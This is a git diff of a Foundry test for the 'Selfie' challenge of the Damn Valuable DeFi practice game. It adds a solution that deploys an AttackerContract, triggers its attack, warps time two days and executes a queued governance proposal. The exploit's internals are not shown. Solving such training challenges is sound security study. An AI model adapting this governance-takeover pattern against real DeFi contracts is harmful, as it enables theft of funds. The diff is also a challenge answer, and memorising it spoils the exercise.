@@ -5,7 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
-import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {SelfiePool, AttackerContract} from "../../src/selfie/SelfiePool.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -61,7 +61,15 @@ contract SelfieChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_selfie() public checkSolvedByPlayer {}
+    function test_selfie() public checkSolvedByPlayer {
+        AttackerContract attacker = new AttackerContract(recovery, address(pool), address(governance), address(token));
+        attacker.attack();
+
+        // time skip 2 days to execute the queued action
+        vm.warp(block.timestamp + 2 days);
+        // governance.executeAction();
+        attacker.executeProposal();
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
